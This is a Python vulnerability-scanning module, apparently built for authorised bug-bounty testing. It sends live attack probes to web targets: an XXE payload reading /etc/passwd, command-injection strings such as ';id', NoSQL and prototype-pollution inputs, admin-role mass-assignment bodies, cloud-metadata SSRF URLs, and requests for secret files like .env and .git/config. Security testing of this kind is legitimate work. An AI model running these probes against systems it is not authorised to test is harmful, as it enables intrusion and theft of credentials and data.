"""Deep attack surface — OWASP WSTG / Bugcrowd-style in-depth bug hunting."""

from __future__ import annotations

import asyncio
import json
import re
from urllib.parse import parse_qs, urlencode, urljoin, urlparse, urlunparse

import httpx

from core.config import FORBIDDEN_PATHS, HTTP_TIMEOUT, REQUEST_DELAY, USER_AGENT
from core.content_validator import is_html_response, validate_path_traversal, validate_sensitive_path

EVIL = "https://evil-attacker-security-test.example.com"
PROBE = "vdpDeepProbe991"

# Hidden / high-value paths from real bug bounty reports
HIDDEN_PATHS = [
    "/.git/HEAD", "/.git/config", "/.env", "/.env.local", "/.env.production", "/.env.backup",
    "/backup.zip", "/backup.tar.gz", "/db.sql", "/dump.sql", "/database.sql",
    "/phpinfo.php", "/info.php", "/test.php", "/debug", "/debug/default/view",
    "/actuator", "/actuator/env", "/actuator/health", "/actuator/mappings", "/actuator/beans",
    "/server-status", "/server-info", "/.DS_Store", "/crossdomain.xml",
    "/swagger-ui.html", "/swagger.json", "/openapi.json", "/api-docs", "/v2/api-docs", "/v3/api-docs",
    "/graphql", "/graphiql", "/playground", "/altair",
    "/admin", "/administrator", "/console", "/manager/html", "/wp-admin", "/wp-login.php",
    "/.well-known/security.txt", "/.well-known/openid-configuration", "/.well-known/change-password",
    "/robots.txt", "/sitemap.xml", "/crossdomain.xml", "/clientaccesspolicy.xml",
    "/trace.axd", "/elmah.axd", "/web.config", "/config.json", "/appsettings.json",
    "/package.json", "/composer.json", "/yarn.lock", "/package-lock.json",
    "/static/js/main.js.map", "/main.js.map", "/app.js.map", "/bundle.js.map",
    "/_debug", "/__debug__", "/debug/pprof", "/metrics", "/prometheus",
    "/cgi-bin/", "/shell", "/cmd", "/execute", "/eval",
    "/api/internal", "/internal", "/private", "/staging", "/dev", "/test",
    "/oauth/authorize", "/oauth/token", "/.git/index", "/.svn/entries",
    "/WEB-INF/web.xml", "/META-INF/MANIFEST.MF",
    "/api/jsonws/", "/c/portal/login", "/group/control_panel/manage",
]

NOSQL_PAYLOADS = [
    '{"$gt":""}', '{"$ne":null}', "admin'||'1'=='1", '{"$where":"1==1"}',
]
CMDI_PAYLOADS = [
    ";id", "|id", "`id`", "$(id)", "{{7*7}}",
]
XXE_BODY = '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'''
PROTO_POLLUTE = {"__proto__": {"polluted": "vdp"}, "constructor": {"prototype": {"polluted": "vdp"}}}

HTTP_METHODS = ["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS", "HEAD", "TRACE"]

_SQL_ERR = ("sql syntax", "mysql", "postgresql", "ora-", "sqlite", "odbc", "syntax error")
_NOSQL_ERR = ("mongoerror", "bson", "cast to objectid", "mongodb")
_CMDI_SIG = ("uid=", "gid=", "groups=", "www-data", "root:x:")


class DeepAttackHunter:
    """In-depth multi-technique vulnerability hunter."""

    def __init__(self):
        self.findings: list[dict] = []
        self.stats = {"techniques": 0, "checks": 0, "hits": 0}

    def _add(self, **kw):
        self.stats["hits"] += 1
        self.findings.append({
            "id": kw.get("id", f"atk-{abs(hash(kw.get('target',''))) % 10**9}"),
            "target": kw["target"],
            "title": kw["title"],
            "severity": kw.get("severity", "medium"),
            "category": kw.get("category", "Deep Attack"),
            "description": kw.get("description", ""),
            "evidence": (kw.get("evidence") or "")[:400],
            "remediation": kw.get("remediation", "Remediate per OWASP ASVS."),
            "exploitable": kw.get("exploitable", False),
            "detection_source": "deep_attack_hunter",
            "technique": kw.get("technique", "generic"),
            "confidence": kw.get("confidence", 55),
        })

    async def run_all(self, urls: list[str], pages: list[dict] | None = None) -> list[dict]:
        self.findings = []
        self.stats = {"techniques": 0, "checks": 0, "hits": 0}
        targets = list(dict.fromkeys(urls[:15]))
        pages = pages or []

        timeout = httpx.Timeout(8.0, connect=3.0)
        async with httpx.AsyncClient(
            timeout=timeout,
            follow_redirects=True,
            headers={"User-Agent": USER_AGENT},
            limits=httpx.Limits(max_connections=40),
        ) as client:
            for url in targets:
                await asyncio.gather(
                    self._hidden_paths(client, url),
                    self._method_fuzz(client, url),
                    self._cors_deep(client, url),
                    self._xxe_probe(client, url),
                    self._nosql_probe(client, url),
                    self._cmdi_soft(client, url),
                    self._prototype_pollution(client, url),
                    self._param_pollution(client, url),
                    self._json_content_confusion(client, url),
                    self._oauth_oidc(client, url),
                    self._source_maps(client, url),
                    self._robots_mining(client, url),
                    self._websocket_hints(client, url),
                    self._csrf_forms(client, url),
                    self._mass_assignment(client, url),
                    self._cloud_ssrf(client, url),
                    return_exceptions=True,
                )
                self.stats["techniques"] += 16
                await asyncio.sleep(REQUEST_DELAY * 0.2)

            # Extract endpoints from crawled JS/HTML and attack them
            endpoints = self._extract_endpoints(pages)
            for ep in endpoints[:40]:
                await self._attack_discovered_endpoint(client, ep)
                await asyncio.sleep(REQUEST_DELAY * 0.1)

        return self.findings

    def _extract_endpoints(self, pages: list[dict]) -> list[str]:
        found: set[str] = set()
        pat = re.compile(
            r"""['"](https?://[^'"]+|/(?:api|v\d+|o|rest|graphql|admin|auth|oauth|user|users|account)[^'"]{0,80})['"]""",
            re.I,
        )
        for page in pages[:25]:
            try:
                from pathlib import Path
                text = Path(page["source_path"]).read_text(encoding="utf-8", errors="replace")[:60000]
            except Exception:
                continue
            base = page.get("url", "")
            for m in pat.findall(text):
                if m.startswith("http"):
                    found.add(m.split("?")[0][:200])
                else:
                    found.add(urljoin(base, m).split("?")[0][:200])
        return list(found)

    async def _attack_discovered_endpoint(self, client, url: str):
        if any(f in url for f in FORBIDDEN_PATHS):
            return
        self.stats["checks"] += 1
        try:
            r = await client.get(url, headers={"Accept": "application/json"})
            ct = r.headers.get("content-type", "")
            if r.status_code == 200 and "json" in ct and not is_html_response(r.text, ct):
                sens = any(k in r.text.lower() for k in (
                    "password", "email", "token", "secret", "ssn", "phone", "api_key", "private"
                ))
                if sens:
                    self._add(
                        id=f"ep-json-{abs(hash(url))%10**8}",
                        target=url, title="Discovered API Leaks Sensitive JSON",
                        severity="high", category="IDOR",
                        technique="endpoint_discovery",
                        description="JS/HTML-discovered endpoint returns sensitive fields without auth.",
                        evidence=r.text[:300], exploitable=True, confidence=70,
                    )
        except Exception:
            pass

    async def _hidden_paths(self, client, base: str):
        for path in HIDDEN_PATHS:
            if path in FORBIDDEN_PATHS:
                continue
            test = urljoin(base.rstrip("/") + "/", path.lstrip("/"))
            self.stats["checks"] += 1
            try:
                r = await client.get(test)
                ct = r.headers.get("content-type", "")
                body = r.text[:3000]
                if r.status_code != 200 or len(body) < 5:
                    continue
                if path in ("/robots.txt", "/sitemap.xml", "/.well-known/security.txt"):
                    # Mine robots for Disallow paths
                    if path == "/robots.txt":
                        for line in body.splitlines():
                            if line.lower().startswith("disallow:"):
                                p = line.split(":", 1)[-1].strip()
                                if p and p != "/" and len(p) > 1:
                                    await self._probe_robot_path(client, base, p)
                    continue
                vr = validate_sensitive_path(path, body, ct, r.status_code)
                if vr.valid:
                    self._add(
                        id=f"hidden-{abs(hash(test))%10**8}", target=test,
                        title=f"Exposed Sensitive Path: {path}",
                        severity="critical", category="Information Disclosure",
                        technique="hidden_path", evidence=vr.reason,
                        exploitable=True, confidence=vr.confidence,
                    )
                elif path.endswith(".map") and ("mappings" in body or '"sources"' in body):
                    self._add(
                        id=f"sourcemap-{abs(hash(test))%10**8}", target=test,
                        title="JavaScript Source Map Exposed",
                        severity="medium", category="Information Disclosure",
                        technique="source_map", evidence=body[:150],
                        confidence=80, exploitable=False,
                    )
                elif path in ("/actuator/env", "/metrics", "/swagger.json", "/openapi.json") and not is_html_response(body, ct):
                    self._add(
                        id=f"debug-{abs(hash(test))%10**8}", target=test,
                        title=f"Debug/Admin Surface Exposed: {path}",
                        severity="high", category="Attack Surface",
                        technique="debug_endpoint", evidence=body[:200],
                        exploitable=True, confidence=75,
                    )
            except Exception:
                pass

    async def _probe_robot_path(self, client, base, path):
        test = urljoin(base, path)
        try:
            r = await client.get(test)
            if r.status_code == 200 and len(r.text) > 100:
                self._add(
                    id=f"robots-{abs(hash(test))%10**8}", target=test,
                    title=f"robots.txt Disallowed Path Accessible: {path}",
                    severity="info", category="Attack Surface",
                    technique="robots_mining", evidence=f"HTTP 200 ({len(r.text)} bytes)",
                    confidence=50,
                )
        except Exception:
            pass

    async def _method_fuzz(self, client, url: str):
        self.stats["checks"] += 1
        try:
            r = await client.request("OPTIONS", url)
            allow = r.headers.get("allow", "") or r.headers.get("access-control-allow-methods", "")
            dangerous = [m for m in ("PUT", "DELETE", "TRACE", "CONNECT") if m in allow.upper()]
            if dangerous:
                self._add(
                    id=f"method-{abs(hash(url))%10**8}", target=url,
                    title=f"Dangerous HTTP Methods: {', '.join(dangerous)}",
                    severity="medium", category="HTTP Methods",
                    technique="method_fuzz", evidence=f"Allow: {allow}",
                    confidence=70,
                )
            if "TRACE" in allow.upper():
                tr = await client.request("TRACE", url)
                if tr.status_code == 200 and "TRACE" in tr.text.upper():
                    self._add(
                        id=f"trace-{abs(hash(url))%10**8}", target=url,
                        title="HTTP TRACE Enabled (XST Risk)",
                        severity="low", category="HTTP Methods",
                        technique="trace", evidence=tr.text[:150],
                        exploitable=True, confidence=85,
                    )
        except Exception:
            pass

    async def _cors_deep(self, client, url: str):
        origins = [
            "https://evil-attacker-security-test.example.com",
            "null",
            "https://evil.example.com",
            urlparse(url)._replace(netloc="evil." + urlparse(url).netloc).geturl(),
        ]
        for origin in origins:
            self.stats["checks"] += 1
            try:
                r = await client.get(url, headers={"Origin": origin})
                acao = [v for k, v in r.headers.multi_items() if k.lower() == "access-control-allow-origin"]
                acac = r.headers.get("access-control-allow-credentials", "").lower() == "true"
                if len(acao) == 1 and acao[0] == origin and acac and origin != "null":
                    self._add(
                        id=f"cors-{abs(hash(url+origin))%10**8}", target=url,
                        title="CORS Reflects Arbitrary Origin with Credentials",
                        severity="high", category="CORS",
                        technique="cors_deep", evidence=f"ACAO={acao} ACAC=true Origin={origin}",
                        exploitable=True, confidence=90,
                    )
                    return
                if origin == "null" and "null" in acao and acac:
                    self._add(
                        id=f"cors-null-{abs(hash(url))%10**8}", target=url,
                        title="CORS Allows null Origin with Credentials",
                        severity="medium", category="CORS",
                        technique="cors_null", evidence=str(acao),
                        exploitable=True, confidence=80,
                    )
            except Exception:
                pass

    async def _xxe_probe(self, client, url: str):
        self.stats["checks"] += 1
        try:
            r = await client.post(
                url, content=XXE_BODY,
                headers={"Content-Type": "application/xml"},
            )
            if "root:" in r.text or "/bin/" in r.text:
                vr = validate_path_traversal(r.text, r.headers.get("content-type", ""))
                if vr.valid:
                    self._add(
                        id=f"xxe-{abs(hash(url))%10**8}", target=url,
                        title="XXE — External Entity Processed",
                        severity="critical", category="XXE",
                        technique="xxe", evidence=vr.reason,
                        exploitable=True, confidence=95,
                    )
        except Exception:
            pass

    async def _nosql_probe(self, client, url: str):
        parsed = urlparse(url)
        for param in ("user", "username", "id", "email", "q"):
            for payload in NOSQL_PAYLOADS[:2]:
                test = urlunparse(parsed._replace(query=urlencode({param: payload})))
                self.stats["checks"] += 1
                try:
                    r = await client.get(test)
                    if any(e in r.text.lower() for e in _NOSQL_ERR):
                        self._add(
                            id=f"nosql-{abs(hash(test))%10**8}", target=test,
                            title=f"NoSQL Injection Error via {param}",
                            severity="high", category="NoSQL Injection",
                            technique="nosql", evidence=r.text[:200],
                            exploitable=True, confidence=85,
                        )
                        return
                    # JSON body probe
                    r2 = await client.post(url, json={param: {"$gt": ""}}, headers={"Content-Type": "application/json"})
                    if r2.status_code == 200 and "json" in r2.headers.get("content-type", ""):
                        if any(k in r2.text.lower() for k in ("token", "email", "password", "role", "admin")):
                            self._add(
                                id=f"nosql-json-{abs(hash(url+param))%10**8}", target=url,
                                title="Possible NoSQL Operator Injection (JSON)",
                                severity="high", category="NoSQL Injection",
                                technique="nosql_json", evidence=r2.text[:200],
                                exploitable=False, confidence=60,
                            )
                            return
                except Exception:
                    pass

    async def _cmdi_soft(self, client, url: str):
        """Soft command-injection detection — only flag clear command output."""
        parsed = urlparse(url)
        for param in ("cmd", "exec", "command", "ping", "host", "ip", "file"):
            for payload in CMDI_PAYLOADS[:2]:
                test = urlunparse(parsed._replace(query=urlencode({param: payload})))
                self.stats["checks"] += 1
                try:
                    r = await client.get(test)
                    if any(s in r.text for s in _CMDI_SIG) and not is_html_response(r.text, r.headers.get("content-type", "")):
                        self._add(
                            id=f"cmdi-{abs(hash(test))%10**8}", target=test,
                            title=f"Command Injection Indicator via {param}",
                            severity="critical", category="RCE",
                            technique="cmdi", evidence=r.text[:200],
                            exploitable=True, confidence=90,
                        )
                        return
                except Exception:
                    pass

    async def _prototype_pollution(self, client, url: str):
        self.stats["checks"] += 1
        try:
            r = await client.get(url, params={"__proto__[polluted]": "vdp", "constructor[prototype][polluted]": "vdp"})
            if "polluted" in r.text and "vdp" in r.text:
                self._add(
                    id=f"proto-{abs(hash(url))%10**8}", target=url,
                    title="Prototype Pollution Reflection",
                    severity="medium", category="Prototype Pollution",
                    technique="prototype_pollution", evidence="polluted reflected in response",
                    confidence=65,
                )
            r2 = await client.post(url, json=PROTO_POLLUTE, headers={"Content-Type": "application/json"})
            if r2.status_code < 500 and "polluted" in r2.text:
                self._add(
                    id=f"proto-post-{abs(hash(url))%10**8}", target=url,
                    title="JSON Prototype Pollution Accepted",
                    severity="medium", category="Prototype Pollution",
                    technique="prototype_pollution_json", evidence=r2.text[:150],
                    confidence=60,
                )
        except Exception:
            pass

    async def _param_pollution(self, client, url: str):
        parsed = urlparse(url)
        self.stats["checks"] += 1
        try:
            # HPP: duplicate params
            test = urlunparse(parsed._replace(query=f"id=1&id=2&url={EVIL}&url=https://safe.example"))
            r = await client.get(test, follow_redirects=False)
            loc = r.headers.get("location", "")
            if "evil-attacker" in loc:
                self._add(
                    id=f"hpp-{abs(hash(url))%10**8}", target=test,
                    title="HTTP Parameter Pollution → Open Redirect",
                    severity="medium", category="Open Redirect",
                    technique="hpp", evidence=f"Location: {loc}",
                    exploitable=True, confidence=88,
                )
        except Exception:
            pass

    async def _json_content_confusion(self, client, url: str):
        self.stats["checks"] += 1
        try:
            # Send JSON as form / vice versa
            r = await client.post(
                url,
                content=f'{{"q":"{PROBE}"}}',
                headers={"Content-Type": "application/x-www-form-urlencoded"},
            )
            if PROBE in r.text and PROBE.replace("<", "&lt;") not in r.text:
                self._add(
                    id=f"ctype-{abs(hash(url))%10**8}", target=url,
                    title="Content-Type Confusion Reflection",
                    severity="medium", category="XSS",
                    technique="content_type_confusion", evidence="Probe reflected",
                    confidence=55,
                )
        except Exception:
            pass

    async def _oauth_oidc(self, client, base: str):
        for path in (
            "/.well-known/openid-configuration",
            "/oauth/authorize",
            "/oauth2/authorize",
            "/auth/realms/master/.well-known/openid-configuration",
        ):
            test = urljoin(base.rstrip("/"), path)
            self.stats["checks"] += 1
            try:
                r = await client.get(test)
                if r.status_code == 200 and ("authorization_endpoint" in r.text or "issuer" in r.text):
                    data = r.text[:500]
                    weak = []
                    if '"none"' in r.text.lower() or "alg\":\"none" in r.text.lower():
                        weak.append("none alg advertised")
                    self._add(
                        id=f"oidc-{abs(hash(test))%10**8}", target=test,
                        title="OpenID / OAuth Configuration Exposed",
                        severity="info" if not weak else "medium",
                        category="Authentication",
                        technique="oauth_oidc", evidence=data,
                        confidence=70,
                    )
            except Exception:
                pass

    async def _source_maps(self, client, base: str):
        for path in ("/main.js.map", "/static/js/main.js.map", "/app.js.map", "/bundle.js.map", "/index.js.map"):
            test = urljoin(base.rstrip("/"), path)
            self.stats["checks"] += 1
            try:
                r = await client.get(test)
                if r.status_code == 200 and '"sources"' in r.text and '"mappings"' in r.text:
                    self._add(
                        id=f"map-{abs(hash(test))%10**8}", target=test,
                        title="Source Map Disclosure",
                        severity="medium", category="Information Disclosure",
                        technique="source_map", evidence=r.text[:120],
                        confidence=85,
                    )
                    return
            except Exception:
                pass

    async def _robots_mining(self, client, base: str):
        # Already handled inside hidden_paths for robots.txt
        pass

    async def _websocket_hints(self, client, base: str):
        for path in ("/ws", "/websocket", "/socket.io/", "/sockjs/", "/cable", "/graphql"):
            test = urljoin(base.rstrip("/"), path)
            self.stats["checks"] += 1
            try:
                r = await client.get(test, headers={"Upgrade": "websocket", "Connection": "Upgrade"})
                if r.status_code in (101, 400, 426) or "websocket" in r.text.lower() or "upgrade" in str(r.headers).lower():
                    if r.status_code != 404:
                        self._add(
                            id=f"ws-{abs(hash(test))%10**8}", target=test,
                            title=f"WebSocket Endpoint Present: {path}",
                            severity="info", category="Attack Surface",
                            technique="websocket", evidence=f"HTTP {r.status_code}",
                            confidence=50,
                        )
            except Exception:
                pass

    async def _csrf_forms(self, client, url: str):
        self.stats["checks"] += 1
        try:
            r = await client.get(url)
            forms = re.findall(r"<form[^>]*>(.*?)</form>", r.text, re.I | re.S)
            for form in forms[:5]:
                has_pass = bool(re.search(r'type=["\']password["\']', form, re.I))
                has_csrf = bool(re.search(r'csrf|authenticity_token|_token|nonce', form, re.I))
                method = "post" if re.search(r'method=["\']post["\']', form, re.I) else "get"
                if has_pass and method == "post" and not has_csrf:
                    self._add(
                        id=f"csrf-{abs(hash(url))%10**8}", target=url,
                        title="Login Form Missing Anti-CSRF Token",
                        severity="medium", category="CSRF",
                        technique="csrf", evidence="password form POST without CSRF token",
                        confidence=65,
                    )
                    return
        except Exception:
            pass

    async def _mass_assignment(self, client, url: str):
        self.stats["checks"] += 1
        payloads = [
            {"role": "admin", "isAdmin": True, "admin": True},
            {"user": {"role": "admin"}},
        ]
        for body in payloads:
            try:
                r = await client.post(url, json=body, headers={"Content-Type": "application/json"})
                if r.status_code == 200 and any(k in r.text.lower() for k in ('"role":"admin"', '"isadmin":true', "administrator")):
                    self._add(
                        id=f"mass-{abs(hash(url))%10**8}", target=url,
                        title="Possible Mass Assignment (role/admin accepted)",
                        severity="high", category="Broken Access Control",
                        technique="mass_assignment", evidence=r.text[:200],
                        exploitable=False, confidence=55,
                    )
                    return
            except Exception:
                pass

    async def _cloud_ssrf(self, client, url: str):
        parsed = urlparse(url)
        cloud_targets = [
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://127.0.0.1:80/",
            "http://[::1]/",
        ]
        for param in ("url", "uri", "path", "dest", "proxy", "fetch", "src", "webhook"):
            for target in cloud_targets[:2]:
                test = urlunparse(parsed._replace(query=urlencode({param: target})))
                self.stats["checks"] += 1
                try:
                    r = await client.get(test, follow_redirects=False)
                    loc = r.headers.get("location", "")
                    body = r.text[:500].lower()
                    if "ami-id" in body or "instance-id" in body or "computeMetadata" in body:
                        self._add(
                            id=f"ssrf-cloud-{abs(hash(test))%10**8}", target=test,
                            title="Cloud Metadata SSRF",
                            severity="critical", category="SSRF",
                            technique="cloud_ssrf", evidence=r.text[:200],
                            exploitable=True, confidence=95,
                        )
                        return
                    if r.status_code in (301, 302) and ("169.254" in loc or "127.0.0.1" in loc):
                        self._add(
                            id=f"ssrf-redir-{abs(hash(test))%10**8}", target=test,
                            title="SSRF Redirect to Internal Address",
                            severity="high", category="SSRF",
                            technique="ssrf_redirect", evidence=f"Location: {loc}",
                            exploitable=True, confidence=88,
                        )
                        return
                except Exception:
                    pass
